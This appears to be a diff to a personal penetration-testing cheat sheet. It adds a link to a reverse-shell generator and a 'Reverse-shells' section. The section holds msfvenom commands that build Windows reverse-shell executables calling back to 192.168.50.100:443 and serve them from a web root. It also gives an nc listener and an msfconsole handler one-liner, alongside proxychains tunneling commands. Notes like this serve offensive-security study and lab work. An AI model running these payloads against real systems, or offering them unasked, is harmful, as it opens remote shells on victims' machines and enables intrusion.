@@ -4,6 +4,7 @@
 https://github.com/swisskyrepo/PayloadsAllTheThings
 <br /> https://www.exploit-db.com/
 <br /> https://book.hacktricks.xyz/
+<br /> https://www.revshells.com/
 
 ## Transfert / Tunneling
 
@@ -85,6 +86,20 @@ https://github.com/swisskyrepo/PayloadsAllTheThings
     sudo ss -ntplu
     echo “socks5 127.0.0.1 9998” >> /etc/proxychains4.conf
     sudo vim /etc/proxychains4.conf
+    
+## Reverse-shells 
+
+    msfvenom -p windows/powershell_reverse_tcp LHOST=192.168.50.100 LPORT=443 -f exe > /var/www/html/msfvenom.exe
+    msfvenom -p windows/shell/reverse_tcp LHOST=192.168.50.100 LPORT=443 -f exe > /var/www/html/msfvenom.exe
+    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.100 LPORT=443 -f exe > /var/www/html/msfvenom.exe
+    msfvenom -p windows/x64/powershell_reverse_tcp LHOST=192.168.50.100 LPORT=443 -f exe > /var/www/html/msfvenom.exe
+    msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.50.100 LPORT=443 -f exe > /var/www/html/msfvenom.exe
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.50.100 LPORT=443 -f exe > /var/www/html/msfvenom.exe
+    ...
+    rlwrap nc -nvlp  443
+    msfconsole -x "use exploit/multi/handler;set payload windows/powershell_reverse_tcp;set LHOST 192.168.50.100;set LPORT 443;run;"
+    ...
+    
 
 ## Énumération	
 
